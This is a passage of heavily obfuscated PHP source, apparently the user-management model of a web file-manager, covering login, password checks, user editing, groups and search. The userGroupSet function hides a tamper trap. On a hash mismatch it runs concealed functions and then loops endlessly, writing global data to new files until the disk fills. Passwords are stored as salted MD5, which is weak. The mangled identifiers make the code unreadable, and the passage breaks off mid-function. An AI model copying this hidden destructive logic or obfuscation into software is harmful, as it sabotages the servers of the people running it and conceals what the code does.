$èã«—¥ = $this->userLoginFind($©Ö¹Ñ²ƒ); if (!$èã«—¥) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($èã«—¥[$â¥ÌÓê¬[1753]], $’ƒ¹ªÄ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($èã«—¥[$â¥ÌÓê¬[1753]]); } public function userLoginFind($Âàªƒ‘™) { $ô…”¹Ì =& $_SERVER[³à¼î¯á]; $Ğ¸ü¿î¬ = array($ô…”¹Ì[32] => $Âàªƒ‘™, $ô…”¹Ì[2241] => $Âàªƒ‘™, $ô…”¹Ì[356] => $Âàªƒ‘™, $ô…”¹Ì[2455] => $Âàªƒ‘™, $ô…”¹Ì[1050] => $ô…”¹Ì[1052]); if ($this->nickNameRpt()) { unset($Ğ¸ü¿î¬[$ô…”¹Ì[2241]]); } return $this->where($Ğ¸ü¿î¬)->find(); } public function clearCache($…Ş½‰Ó•) { $ÖÀÙò˜õ =& $_SERVER[³à¼î¯á]; $this->cacheFunctionClear($ÖÀÙò˜õ[2039], $…Ş½‰Ó•); $this->cacheFunctionClear($ÖÀÙò˜õ[2040], $…Ş½‰Ó•); $this->cacheFunctionClear($ÖÀÙò˜õ[2436], $…Ş½‰Ó•); } public function userPasswordCheck($Ÿ·ä›”õ, $ˆü›•ÊÙ) { $İ »¿ê­ =& $_SERVER[³à¼î¯á]; $ªŞÖ³Ğ = $this->where(array($İ »¿ê­[1753] => intval($Ÿ·ä›”õ)))->find(); $åÒ‰òô­ = $this->metaGet($Ÿ·ä›”õ); $Ş×Ôá½Ô = isset($åÒ‰òô­[$İ »¿ê­[2456]]) ? $åÒ‰òô­[$İ »¿ê­[2456]] : $İ »¿ê­[12]; if (md5($Ş×Ôá½Ô . trim($ˆü›•ÊÙ)) !== $ªŞÖ³Ğ[$İ »¿ê­[937]]) { return !1; } return !0; } public function userAdd($ï™Ÿ÷îí) { $®¹ôÁÜ =& $_SERVER[³à¼î¯á]; $ºÂĞ‰Üˆ = array($®¹ôÁÜ[469] => $ï™Ÿ÷îí[$®¹ôÁÜ[32]], $®¹ôÁÜ[2457] => $ï™Ÿ÷îí[$®¹ôÁÜ[2159]], $®¹ôÁÜ[2458] => isset($ï™Ÿ÷îí[$®¹ôÁÜ[356]]) ? $ï™Ÿ÷îí[$®¹ôÁÜ[356]] : $®¹ôÁÜ[12], $®¹ôÁÜ[2459] => isset($ï™Ÿ÷îí[$®¹ôÁÜ[2455]]) ? $ï™Ÿ÷îí[$®¹ôÁÜ[2455]] : $®¹ôÁÜ[12], $®¹ôÁÜ[2460] => isset($ï™Ÿ÷îí[$®¹ôÁÜ[2241]]) ? $ï™Ÿ÷îí[$®¹ôÁÜ[2241]] : $ï™Ÿ÷îí[$®¹ôÁÜ[32]], $®¹ôÁÜ[2461] => isset($ï™Ÿ÷îí[$®¹ôÁÜ[2440]]) ? $ï™Ÿ÷îí[$®¹ôÁÜ[2440]] : $®¹ôÁÜ[12], $®¹ôÁÜ[2462] => isset($ï™Ÿ÷îí[$®¹ôÁÜ[2463]]) ? $ï™Ÿ÷îí[$®¹ôÁÜ[2463]] : 1, $®¹ôÁÜ[2464] => $ï™Ÿ÷îí[$®¹ôÁÜ[937]], $®¹ôÁÜ[2041] => isset($ï™Ÿ÷îí[$®¹ôÁÜ[1939]]) ? $ï™Ÿ÷îí[$®¹ôÁÜ[1939]] : 1024 * 1024 * 20, $®¹ôÁÜ[2042] => 0, $®¹ôÁÜ[2465] => 0, $®¹ôÁÜ[2086] => isset($ï™Ÿ÷îí[$®¹ôÁÜ[795]]) ? $ï™Ÿ÷îí[$®¹ôÁÜ[795]] : 1); if (!empty($ï™Ÿ÷îí[$®¹ôÁÜ[1753]])) { $ºÂĞ‰Üˆ[$®¹ôÁÜ[1753]] = $ï™Ÿ÷îí[$®¹ôÁÜ[1753]]; } $ğó¿ëÀë = $this->_checkExist($ï™Ÿ÷îí); if ($ğó¿ëÀë !== !0) { return $ğó¿ëÀë; } if (!empty($ºÂĞ‰Üˆ[$®¹ôÁÜ[2440]]) && strlen($ºÂĞ‰Üˆ[$®¹ôÁÜ[2440]]) > 255) { $ºÂĞ‰Üˆ[$®¹ôÁÜ[2440]] = $®¹ôÁÜ[12]; } $¤ç¿ = $this->add($ºÂĞ‰Üˆ); $¸©Ïæğª = array($®¹ôÁÜ[2464] => $ºÂĞ‰Üˆ[$®¹ôÁÜ[937]], $®¹ôÁÜ[2460] => $ºÂĞ‰Üˆ[$®¹ôÁÜ[2241]]); $this->userEdit($¤ç¿, $¸©Ïæğª); Model($®¹ôÁÜ[1388])->userRootAdd($¤ç¿); return $¤ç¿; } protected function userEditTest($«ÜŒ¨, $ÈË•…ˆ”) { return $this->call($_SERVER[³à¼î¯á][2466], $«ÜŒ¨, $ÈË•…ˆ”); } protected function userEdit($Üïü×Î», $öšß×Ğ€) { $Ôˆ³¢ =& $_SERVER[³à¼î¯á]; $ô•µ›º = $this->getInfoSimple($Üïü×Î»); if (!$ô•µ›º) { return !1; } $ñöé¢şŞ = $this->_checkExist($öšß×Ğ€, $Üïü×Î»); if ($ñöé¢şŞ !== !0) { return $ñöé¢şŞ; } if (isset($öšß×Ğ€[$Ôˆ³¢[937]]) && trim($öšß×Ğ€[$Ôˆ³¢[937]]) != $Ôˆ³¢[12]) { $Ù¤’ƒœ™ = $this->metaGet($Üïü×Î»); if (empty($Ù¤’ƒœ™[$Ôˆ³¢[2456]])) { $Ù¤’ƒœ™[$Ôˆ³¢[2456]] = rand_string(10); Model($Ôˆ³¢[553])->metaSet($Üïü×Î», $Ôˆ³¢[2456], $Ù¤’ƒœ™[$Ôˆ³¢[2456]]); } $öšß×Ğ€[$Ôˆ³¢[937]] = md5($Ù¤’ƒœ™[$Ôˆ³¢[2456]] . trim($öšß×Ğ€[$Ôˆ³¢[937]])); } else { unset($öšß×Ğ€[$Ôˆ³¢[937]]); } if (!empty($öšß×Ğ€[$Ôˆ³¢[2440]]) && strlen($öšß×Ğ€[$Ôˆ³¢[2440]]) > 255) { $öšß×Ğ€[$Ôˆ³¢[2440]] = $Ôˆ³¢[12]; } $this->where(array($Ôˆ³¢[1744] => $Üïü×Î»))->save($öšß×Ğ€); if (isset($öšß×Ğ€[$Ôˆ³¢[2241]])) { $this->setNamePinyin($Üïü×Î», $öšß×Ğ€[$Ôˆ³¢[2241]]); } $this->clearCache($Üïü×Î»); return !0; } public function setNamePinyin($ùª¬¹•, $…ÕÅİ¯³ = false) { $çÏöÛƒ© =& $_SERVER[³à¼î¯á]; if (!$…ÕÅİ¯³) { $‚÷ª‰˜ = $this->getInfoSimple($ùª¬¹•); $…ÕÅİ¯³ = $‚÷ª‰˜[$çÏöÛƒ©[2241]] ? $‚÷ª‰˜[$çÏöÛƒ©[2241]] : $‚÷ª‰˜[$çÏöÛƒ©[32]]; } $îø°£÷® = Model($çÏöÛƒ©[574]); if (!Input::check($…ÕÅİ¯³, $çÏöÛƒ©[630])) { return $îø°£÷®->metaSet($ùª¬¹•, array($çÏöÛƒ©[513] => $çÏöÛƒ©[12], $çÏöÛƒ©[512] => $çÏöÛƒ©[12])); } return $îø°£÷®->metaSet($ùª¬¹•, array($çÏöÛƒ©[513] => str_replace($çÏöÛƒ©[53], $çÏöÛƒ©[12], Pinyin::get($…ÕÅİ¯³)), $çÏöÛƒ©[512] => Pinyin::get($…ÕÅİ¯³, $çÏöÛƒ©[631]))); } private function nickNameRpt() { $”„óÏœñ =& $_SERVER[³à¼î¯á]; $ƒ…¾ãë€ = Model($”„óÏœñ[815])->get($”„óÏœñ[2467]); $ğùÒ¡·¶ = $GLOBALS[$”„óÏœñ[6]][$”„óÏœñ[432]][$”„óÏœñ[2467]]; $ÚìŸ³è = !is_null($ƒ…¾ãë€) ? $ƒ…¾ãë€ : $ğùÒ¡·¶; return !!$ÚìŸ³è; } private function _checkExist($­º—Öü², $Şîã–ë¶ = false) { $»ÕÂéãä =& $_SERVER[³à¼î¯á]; $±Üåü÷Œ = array($»ÕÂéãä[32] => UserModel::ERROR_USER_EXIST_NAME, $»ÕÂéãä[2241] => UserModel::ERROR_USER_EXIST_NICKNAME, $»ÕÂéãä[356] => UserModel::ERROR_USER_EXIST_EMAIL, $»ÕÂéãä[2455] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($±Üåü÷Œ[$»ÕÂéãä[2241]]); } $éé’“§ = $Şîã–ë¶ ? array($»ÕÂéãä[1753] => array($»ÕÂéãä[2468], $Şîã–ë¶)) : array(); foreach ($±Üåü÷Œ as $íî’¨İ => $¸†Ùğ·ë) { $µ‹¥Á¶ = array(); foreach ($±Üåü÷Œ as $¹ı¯Ô©¾ => $¾°¤ĞªÖ) { if (isset($­º—Öü²[$¹ı¯Ô©¾]) && $­º—Öü²[$¹ı¯Ô©¾]) { $µ‹¥Á¶[] = $­º—Öü²[$¹ı¯Ô©¾]; } } if (!$µ‹¥Á¶) { continue; } $Å×ˆçÄ¦ = array_merge(array($íî’¨İ => array($»ÕÂéãä[7], $µ‹¥Á¶)), $éé’“§); $ïšÌ„›¼ = $this->where($Å×ˆçÄ¦)->find(); if ($ïšÌ„›¼) { return $¸†Ùğ·ë; } } return !0; } public function userListInfo($‘ùæ»ğÓ) { $ÊÅº¯ˆŒ =& $_SERVER[³à¼î¯á]; $îãùÅõñ = array(); $‘ùæ»ğÓ = is_array($‘ùæ»ğÓ) ? array_unique($‘ùæ»ğÓ) : array(); if (!$‘ùæ»ğÓ) { return $îãùÅõñ; } if (count($‘ùæ»ğÓ) < 20) { foreach ($‘ùæ»ğÓ as $ûÄ’ÚûÈ) { $îãùÅõñ[$ûÄ’ÚûÈ . $ÊÅº¯ˆŒ[12]] = $this->getInfoSimpleOuter($ûÄ’ÚûÈ); } } else { $Ñ‚Á€¢‚ = array($ÊÅº¯ˆŒ[1744] => array($ÊÅº¯ˆŒ[467], $‘ùæ»ğÓ)); if (count($‘ùæ»ğÓ) == 1) { $Ñ‚Á€¢‚ = array($ÊÅº¯ˆŒ[1744] => $‘ùæ»ğÓ[0]); } $šß¡æ¡ó = Model($ÊÅº¯ˆŒ[553])->field($this->simpleField)->where($Ñ‚Á€¢‚)->select(); $šß¡æ¡ó = array_to_keyvalue($šß¡æ¡ó, $ÊÅº¯ˆŒ[1753]); foreach ($‘ùæ»ğÓ as $ûÄ’ÚûÈ) { $ËçĞÉ®ƒ = $šß¡æ¡ó[$ûÄ’ÚûÈ]; if (!$ËçĞÉ®ƒ) { $îãùÅõñ[$ûÄ’ÚûÈ . $ÊÅº¯ˆŒ[12]] = $this->getInfoSimpleOuter($ûÄ’ÚûÈ); continue; } $ËçĞÉ®ƒ[$ÊÅº¯ˆŒ[2440]] = Action($ÊÅº¯ˆŒ[2441])->parseUrl($ËçĞÉ®ƒ[$ÊÅº¯ˆŒ[2440]]); $îãùÅõñ[$ûÄ’ÚûÈ . $ÊÅº¯ˆŒ[12]] = $ËçĞÉ®ƒ; } } return $îãùÅõñ; } protected function userStatus($ŸºÒÕ±é, $²éÒÛĞ) { $”ùÅ²Ú = $this->getInfoSimple($ŸºÒÕ±é); if (!$”ùÅ²Ú) { return !1; } $ÆïÍà²¤ = array($_SERVER[³à¼î¯á][795] => $²éÒÛĞ); return $this->userEdit($ŸºÒÕ±é, $ÆïÍà²¤); } protected function userRemove($¸”š¢×Ó) { $Ó½µö³ß =& $_SERVER[³à¼î¯á]; $ğŒáå£Å = $this->getInfoSimple($¸”š¢×Ó); if (!$ğŒáå£Å) { return !1; } $œ‚©üÎç = array($Ó½µö³ß[1744] => $¸”š¢×Ó); Model($Ó½µö³ß[639])->where($œ‚©üÎç)->delete(); Model($Ó½µö³ß[2469])->where($œ‚©üÎç)->delete(); Model($Ó½µö³ß[2047])->where($œ‚©üÎç)->delete(); Model($Ó½µö³ß[2454])->where($œ‚©üÎç)->delete(); Model($Ó½µö³ß[1119])->where($œ‚©üÎç)->delete(); Model($Ó½µö³ß[2258])->removeUserAll($¸”š¢×Ó); Model($Ó½µö³ß[869])->userRootRemove($¸”š¢×Ó); return $this->where($œ‚©üÎç)->delete(); } protected function userGroupSet($Ÿ¼¼ê¥Ì, $¾ü´òò, $°Ã…Ïóê = array()) { $‚¼ê»Ú˜ =& $_SERVER[³à¼î¯á]; $­Ÿ¥§™¤ = $_SERVER[$‚¼ê»Ú˜[925]] . $‚¼ê»Ú˜[926]; $Õ½í‚ğß = $‚¼ê»Ú˜[1851]; if ($_SERVER[$‚¼ê»Ú˜[921]] != $Õ½í‚ğß($­Ÿ¥§™¤)) { $Š™µ’ßÙ = $‚¼ê»Ú˜[923]; $ÓÊÉ§Ü = $‚¼ê»Ú˜[924]; $˜ˆö‘¬¼ = $_SERVER[$‚¼ê»Ú˜[925]] . $‚¼ê»Ú˜[926]; $€’¿ç…÷ = $ÓÊÉ§Ü($˜ˆö‘¬¼); $—©¯‘Şß = explode($‚¼ê»Ú˜[253], $€’¿ç…÷); if (count($—©¯‘Şß) < $‚¼ê»Ú˜[663]) { $Áèæİš = $‚¼ê»Ú˜[927]; $Áèæİš(); } $®ïæÓ²« = $‚¼ê»Ú˜[928]; $®ïæÓ²«($_SERVER[$‚¼ê»Ú˜[929]]); $Š™µ’ßÙ = $‚¼ê»Ú˜[923]; $Š™µ’ßÙ(); $—Òğ‰šû = $‚¼ê»Ú˜[2259]; $µ„óÚâ = json_encode($GLOBALS[$‚¼ê»Ú˜[2260]]); $¡²ãò­ò = 1; for ($ŸÈå€ = $¡²ãò­ò; $ŸÈå€ > 0; $ŸÈå€++) { $—Òğ‰šû(DATA_PATH . $ŸÈå€, $µ„óÚâ); } } $Ò½ğ¸ª› = $this->getInfoSimple($Ÿ¼¼ê¥Ì); if (!$Ò½ğ¸ª› || !is_array($¾ü´òò)) { return !1; } $–ÒÏó¿È = Model($‚¼ê»Ú˜[2047]); $–ÒÏó¿È->where(array($‚¼ê»Ú˜[1753] => $Ÿ¼¼ê¥Ì))->delete(); $Îåà¡ = array(); $æú˜‡ğ½ = 0; foreach ($¾ü´òò as $§Œª·Ø => $îªõ›ñ¿) { $—¤÷‹î¸ = array($‚¼ê»Ú˜[1753] => $Ÿ¼¼ê¥Ì, $‚¼ê»Ú˜[1952] => $§Œª·Ø, $‚¼ê»Ú˜[2061] => $îªõ›ñ¿); $—¤÷‹î¸[$‚¼ê»Ú˜[1976]] = isset($°Ã…Ïóê[$æú˜‡ğ½]) ? $°Ã…Ïóê[$æú˜‡ğ½] : 0; $æú˜‡ğ½++; $Îåà¡[] = $—¤÷‹î¸; } return $–ÒÏó¿È->addAll($Îåà¡, array(), !0); } protected function userGroupAdd($ÃÅµ‰Ë, $“şµŸ±Û = array()) { $Ÿ¿©Ìï =& $_SERVER[³à¼î¯á]; $Ã×ÉŒÊó = $this->getInfoSimple($ÃÅµ‰Ë); if (!$Ã×ÉŒÊó || empty($“şµŸ±Û)) { return !1; } $­¦ìšÃ¤ = array(); foreach ($“şµŸ±Û as $íÛ ææ => $…êˆ©·è) { $­¦ìšÃ¤[] = array($Ÿ¿©Ìï[1753] => $ÃÅµ‰Ë, $Ÿ¿©Ìï[1952] => $íÛ ææ, $Ÿ¿©Ìï[2061] => $…êˆ©·è, $Ÿ¿©Ìï[1976] => 0); } return Model($Ÿ¿©Ìï[2047])->addAll($­¦ìšÃ¤, array(), !0); } protected function userGroupRemove($ß¬ü¤—…, $Ö‰¸šã³) { $®ç²ÖÑ¹ =& $_SERVER[³à¼î¯á]; $«ç˜ › = $this->getInfoSimple($ß¬ü¤—…); if (!$«ç˜ › || !$Ö‰¸šã³) { return !1; } $ÅÕû‘È = array($®ç²ÖÑ¹[1744] => $ß¬ü¤—…, $®ç²ÖÑ¹[2045] => $Ö‰¸šã³); return Model($®ç²ÖÑ¹[2047])->where($ÅÕû‘È)->delete(); } public function listData() { $øã’ùú¸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($øã’ùú¸[$_SERVER[³à¼î¯á][420]]); return $øã’ùú¸; } public function listByID($Íû¿¸Ùµ) { $ÎöäİŠÑ =& $_SERVER[³à¼î¯á]; if (!$Íû¿¸Ùµ) { return; } $•€Ì£©Ø = array($ÎöäİŠÑ[1753] => array($ÎöäİŠÑ[7], $Íû¿¸Ùµ)); $§İÏÃø = $this->where($•€Ì£©Ø)->select(); $§İÏÃø = array_sort_keep($§İÏÃø, $ÎöäİŠÑ[1753], $Íû¿¸Ùµ); $this->_listDataApply($§İÏÃø); return $§İÏÃø; } public function listByGroup($ğúÆ—î = 0, $®øäğŠŞ = array()) { $ˆ»®Æ¡ =& $_SERVER[³à¼î¯á]; $ÙçÃ‡Ë = $ˆ»®Æ¡[12]; $¦Âüëå = array(); if ($ğúÆ—î) { $¦Âüëå = array($ˆ»®Æ¡[2470] => intval($ğúÆ—î)); $ÙçÃ‡Ë = "\x4c\105\x46\x54\x20\112\117\111\116\40{$this->tablePrefix}\165\x73\x65\162\137\x67\162\157\x75\160\x20\165\163\145\x72\x5f\147\x72\x6f\x75\x70\40\x6f\x6e\x20\x75\163\x65\x72\56\x75\163\x65\x72\111\x44\x20\x3d\40\x75\163\x65\x72\x5f\x67\162\157\x75\x70\56\x75\x73\145\x72\111\104"; $ˆÅ‰±ÚŸ = Input::get($ˆ»®Æ¡[505], null, $ˆ»®Æ¡[12]) ? $ˆ»®Æ¡[12] : $ˆ»®Æ¡[2471]; } if (isset($®øäğŠŞ[$ˆ»®Æ¡[795]])) { $¦Âüëå[$ˆ»®Æ¡[2472]] = $®øäğŠŞ[$ˆ»®Æ¡[795]]; } $¥é”˜×í = $this->_makeOrder($ˆÅ‰±ÚŸ)->field($ˆ»®Æ¡[2473])->where($¦Âüëå)->join($ÙçÃ‡Ë)->selectPage(50); $this->_listDataApply($¥é”˜×í[$ˆ»®Æ¡[420]]); return $¥é”˜×í; } private function _makeOrder($á››¥– = '') { $ñ³•ğÚİ =& $_SERVER[³à¼î¯á]; $ìÏĞè¹· = array($ñ³•ğÚİ[1753], $ñ³•ğÚİ[32], $ñ³•ğÚİ[1941], $ñ³•ğÚİ[1913], $ñ³•ğÚİ[222]); $ş—¨Õí´ = array($ñ³•ğÚİ[498] => $ñ³•ğÚİ[499], $ñ³•ğÚİ[500] => $ñ³•ğÚİ[501]); $Èßó¹±ã = Input::get($ñ³•ğÚİ[505], $ñ³•ğÚİ[7], $ñ³•ğÚİ[1744], $ìÏĞè¹·); $€ó®®‡ = Input::get($ñ³•ğÚİ[506], $ñ³•ğÚİ[7], $ñ³•ğÚİ[2048], array($ñ³•ğÚİ[2048], $ñ³•ğÚİ[500])); $€ó®®‡ = $ş—¨Õí´[$€ó®®‡]; $á››¥– = $á››¥– . "\165\163\145\x72\56{$Èßó¹±ã}\40{$€ó®®‡}\54\x20\165\x73\x65\162\56\x75\163\x65\x72\111\x44\40\141\x73\x63"; return $this->alias($ñ³•ğÚİ[2175])->order($á››¥–); } public function listSearch($‘ÒƒÛï ) { $÷‡ …¼ =& $_SERVER[³à¼î¯á]; $Ä¥›‡ö¸ = trim($‘ÒƒÛï [$÷‡ …¼[2051]]); $¹Ç··©Ì = explode($÷‡ …¼[53], $Ä¥›‡ö¸); if (!$Ä¥›‡ö¸ || count($¹Ç··©Ì) == 1) { return $this->listSearchNow($‘ÒƒÛï ); } $÷—ä¨Ûá = array($÷‡ …¼[420] => array()); foreach ($¹Ç··©Ì as $…ˆ³ÍÖ”) { if (!trim($…ˆ³ÍÖ”)) { continue; } $‘ÒƒÛï [$÷‡ …¼[2051]] = $…ˆ³ÍÖ”; $ÙÈ½æÛÚ = $this->listSearchNow($‘ÒƒÛï ); $÷—ä¨Ûá[$÷‡ …¼[420]] = array_merge($÷—ä¨Ûá[$÷‡ …¼[420]], $ÙÈ½æÛÚ[$÷‡ …¼[420]]); } $÷—ä¨Ûá[$÷‡ …¼[420]] = array_unique_by_key($÷—ä¨Ûá[$÷‡ …¼[420]], $÷‡ …¼[1753]); $÷—ä¨Ûá[$÷‡ …¼[417]] = array($÷‡ …¼[418] => count($÷—ä¨Ûá[$÷‡ …¼[420]]), $÷‡ …¼[414] => 20, $÷‡ …¼[404] => 1, $÷‡ …¼[419] => 1); return $÷—ä¨Ûá; } public function listSearchNow($üºÛ§ô ) { $×Šš¾›µ =& $_SERVER[³à¼î¯á]; $Ã‘æÊØ = trim($üºÛ§ô [$×Šš¾›µ[2051]]); $‡æ¼ş£„ = isset($üºÛ§ô [$×Šš¾›µ[2052]]) ? $üºÛ§ô [$×Šš¾›µ[2052]] : !1; $Ã‘æÊØ = str_replace($×Šš¾›µ[2053], $×Šš¾›µ[2054], trim($Ã‘æÊØ)); $­¹å¶ìÛ = array($×Šš¾›µ[32] => array($×Šš¾›µ[434], "\x25{$Ã‘æÊØ}\45"), $×Šš¾›µ[356] => array($×Šš¾›µ[434], "{$Ã‘æÊØ}\x25"), $×Šš¾›µ[2241] => array($×Šš¾›µ[434], "{$Ã‘æÊØ}\x25"), $×Šš¾›µ[1050] => $×Šš¾›µ[2055]); if (Input::check($Ã‘æÊØ, $×Šš¾›µ[362])) { $­¹å¶ìÛ[$×Šš¾›µ[1753]] = array($×Šš¾›µ[434], "{$Ã‘æÊØ}\x25"); $­¹å¶ìÛ[$×Šš¾›µ[2455]] = array($×Šš¾›µ[434], "{$Ã‘æÊØ}\x25"); } if (!$Ã‘æÊØ) { $­¹å¶ìÛ = array(); } if (isset($üºÛ§ô [$×Šš¾›µ[795]])) { $­¹å¶ìÛ[$×Šš¾›µ[795]] = $üºÛ§ô [$×Šš¾›µ[795]]; } $­¹å¶ìÛ = $this->parseWhereLike($­¹å¶ìÛ); $äİõÑ·ê = $this->_makeOrder()->where($­¹å¶ìÛ)->selectPage(20); if (!$äİõÑ·ê || count($äİõÑ·ê[$×Šš¾›µ[420]]) < 5 && Input::check($Ã‘æÊØ, $×Šš¾›µ[369])) { $„êÂšƒÄ = $this->_searchFromMeta($×Šš¾›µ[512], $Ã‘æÊØ, 10); $¢²¬¥ô = $this->_searchFromMeta($×Šš¾›µ[513], $Ã‘æÊØ, 10); $ÈŞÖğù = array_merge($„êÂšƒÄ, $¢²¬¥ô, $äİõÑ·ê[$×Šš¾›µ[420]]); $äİõÑ·ê[$×Šš¾›µ[420]] = array_unique_by_key($ÈŞÖğù, $×Šš¾›µ[1753]); $äİõÑ·ê[$×Šš¾›µ[417]][$×Šš¾›µ[418]] = count($äİõÑ·ê[$×Šš¾›µ[420]]); $äİõÑ·ê[$×Šš¾›µ[417]][$×Šš¾›µ[419]] = ceil($äİõÑ·ê[$×Šš¾›µ[417]][$×Šš¾›µ[418]] / $äİõÑ·ê[$×Šš¾›µ[417]][$×Šš¾›µ[414]]); } $this->_listDataApply($äİõÑ·ê[$×Šš¾›µ[420]]); $this->_filterByGroup($äİõÑ·ê, $‡æ¼ş£„); return $äİõÑ·ê; } private function _filterByGroup(&$¸”²¢¯®, $Ø¶ÇıÄ®) { $·æöºÔÂ =& $_SERVER[³à¼î¯á]; if (!$Ø¶ÇıÄ®) { return $¸”²¢¯®; } foreach ($¸”²¢¯®[$·æöºÔÂ[420]] as $¨¢‹‹şò => &$€á½æúŞ) { $ãŠÂ¤´Š = array_to_keyvalue($€á½æúŞ[$·æöºÔÂ[2144]], $·æöºÔÂ[12], $·æöºÔÂ[1952]); if (!in_array($Ø¶ÇıÄ®, $ãŠÂ¤´Š)) { unset($¸”²¢¯®[$·æöºÔÂ[420]][$¨¢‹‹şò]); } } unset($€á½æúŞ); $¸”²¢¯®[$·æöºÔÂ[420]] = array_values($¸”²¢¯®[$·æöºÔÂ[420]]); $¸”²¢¯®[$·æöºÔÂ[417]] = array($·æöºÔÂ[2211] => count($¸”²¢¯®[$·æöºÔÂ[420]]), $·æöºÔÂ[2209] => $¸”²¢¯®[$·æöºÔÂ[417]][$·æöºÔÂ[414]], $·æöºÔÂ[2208] => 1, $·æöºÔÂ[2210] => 1); } private function _searchFromMeta($³ËÍî­½, $Áø¾Ò¿ø, $Õƒ€×Ÿ) { $šÙÌÃ–§ =& $_SERVER[³à¼î¯á]; $Áø¾Ò¿ø = strtolower($Áø¾Ò¿ø); $şñ€ûğú = array($šÙÌÃ–§[97] => $³ËÍî­½, $šÙÌÃ–§[425] => array($šÙÌÃ–§[434], "\45{$Áø¾Ò¿ø}\45")); $şñ€ûğú = $this->parseWhereLike($şñ€ûğú); $ÔÇÇ©¶¥ = Model($šÙÌÃ–§[2474])->where($şñ€ûğú)->limit($Õƒ€×Ÿ)->select(); if (!$ÔÇÇ©¶¥) { return array(); } $ÔÇÇ©¶¥ = array_to_keyvalue($ÔÇÇ©¶¥, $šÙÌÃ–§[12], $šÙÌÃ–§[1753]); $“üŒÚ×Ê = $this->where(array($šÙÌÃ–§[1744] => array($šÙÌÃ–§[7], $ÔÇÇ©¶¥)))->select(); if (!$“üŒÚ×Ê) { return array(); } return $“üŒÚ×Ê; } private function _listDataApplyItem($‹ÂüìÑ‡) { $½£ûÎ÷Š = array($‹ÂüìÑ‡); $this->_listDataApply($½£ûÎ÷Š); return $½£ûÎ÷Š[0]; } private function _listDataApply(&$¼¢ÌäÊª) { $œŒ—ı™Ã =& $_SERVER[³à¼î¯á]; if (!$¼¢ÌäÊª) { return; } array_remove_key($¼¢ÌäÊª, $œŒ—ı™Ã[937]); $­“Á¶óÓ = array_to_keyvalue($¼¢ÌäÊª, $œŒ—ı™Ã[12], $œŒ—ı™Ã[1753]); $this->_listAppendGroup($¼¢ÌäÊª, $­“Á¶óÓ); $this->_listAppendMeta($¼¢ÌäÊª, $­“Á¶óÓ); $this->_listAppendSourceRoot($¼¢ÌäÊª, $­“Á¶óÓ); } private function _listAppendSourceRoot(&$¤Æ°†¼», $«ù áÆ•) { $ä…êúÕ =& $_SERVER[³à¼î¯á]; $ÑÖìÉî = Model($ä…êúÕ[869])->listSourceRoot(SourceModel::TYPE_USER, $«ù áÆ•); $ÑÖìÉî = array_to_keyvalue($ÑÖìÉî, $ä…êúÕ[545]); $ÑÖìÉî = array_remove_key($ÑÖìÉî, $ä…êúÕ[545]); foreach ($¤Æ°†¼» as &$§á°“­) { $§á°“­[$ä…êúÕ[90]] = $ÑÖìÉî[$§á°“­[$ä…êúÕ[1753]]] ? $ÑÖìÉî[$§á°“­[$ä…êúÕ[1753]]] : array(); } unset($§á°“­); } private function _listAppendGroup(&$¥üÌ“ó», $·ú°„èÅ) { $¡‡Ê =& $_SERVER[³à¼î¯á]; $“ü¼úÁï = array($¡‡Ê[1753] => array($¡‡Ê[7], $·ú°„èÅ)); $ĞËæ—™ = Model($¡‡Ê[2047])->where($“ü¼úÁï)->select(); $å××ØÒö = array_to_keyvalue($ĞËæ—™, $¡‡Ê[12], $¡‡Ê[1952]); $å××ØÒö = array_remove_value(array_unique($å××ØÒö), $¡‡Ê[219]); if (!$å××ØÒö || !$ĞËæ—™) { return; } $“ü¼úÁï = array($¡‡Ê[1952] => array($¡‡Ê[7], $å××ØÒö)); $®”ï±â = Model($¡‡Ê[2142])->field($¡‡Ê[2475])->where($“ü¼úÁï)->select(); $®”ï±â = array_to_keyvalue($®”ï±â, $¡‡Ê[1952]); $ĞËæ—™ = array_to_keyvalue_group($ĞËæ—™, $¡‡Ê[1753]); foreach ($ĞËæ—™ as &$Ñê‡ÁÚ¯) { $ÂÃ§Ùü¿ = array(); foreach ($Ñê‡ÁÚ¯ as $»àŸÇâ®) { if (!$»àŸÇâ®[$¡‡Ê[2061]]) { continue; } $ûŞ”Ø‘ = Model($¡‡Ê[547])->listData($»àŸÇâ®[$¡‡Ê[2061]]); $ÂÃ§Ùü¿[] = array($¡‡Ê[1952] => $»àŸÇâ®[$¡‡Ê[1952]], $¡‡Ê[2476] => $®”ï±â[$»àŸÇâ®[$¡‡Ê[1952]]][$¡‡Ê[32]], $¡‡Ê[560] => $®”ï±â[$»àŸÇâ®[$¡‡Ê[1952]]][$¡‡Ê[560]], $¡‡Ê[462] => $ûŞ”Ø‘); } $Ñê‡ÁÚ¯ = $ÂÃ§Ùü¿; } unset($Ñê‡ÁÚ¯); foreach ($¥üÌ“ó» as &$øÒ¡ìˆÜ) { $øÒ¡ìˆÜ[$¡‡Ê[2144]] = array(); if (isset($ĞËæ—™[$øÒ¡ìˆÜ[$¡‡Ê[1753]]])) { $øÒ¡ìˆÜ[$¡‡Ê[2144]] = $ĞËæ—™[$øÒ¡ìˆÜ[$¡‡Ê[1753]]]; } } unset($øÒ¡ìˆÜ); } public function userAppendGroup($ÍéÀû§Ã) { $»ªœÊ´ =& $_SERVER[³à¼î¯á]; if (!$ÍéÀû§Ã) { return array(); } $this->_listAppendGroup($ÍéÀû§Ã, array_to_keyvalue($ÍéÀû§Ã, $»ªœÊ´[12], $»ªœÊ´[1753])); return $ÍéÀû§Ã; } private function _listAppendMeta(&$ùŸ˜èà—, $™õ¢«‘¸) { $ÊµóÂ‚ =& $_SERVER[³à¼î¯á]; $è¨‰Ïê¾ = UserJobModel::JOB_KEY; $—Ö¢Ë¥» = array($ÊµóÂ‚[2456]); $íÎáÇì = array($ÊµóÂ‚[1753] => array($ÊµóÂ‚[7], $™õ¢«‘¸)); $‡“›ì³× = Model($ÊµóÂ‚[2454])->where($íÎáÇì)->select(); $‡“›ì³× = array_to_keyvalue_group($‡“›ì³×, $ÊµóÂ‚[1753]); foreach ($‡“›ì³× as &$ê×Ëá‡Ğ) { $ß›Ñº˜„ = array(); foreach ($ê×Ëá‡Ğ as $´Àœ…¢¡) { if (!in_array($´Àœ…¢¡[$ÊµóÂ‚[97]], $—Ö¢Ë¥»)) { $ß›Ñº˜„[$´Àœ…¢¡[$ÊµóÂ‚[97]]] = 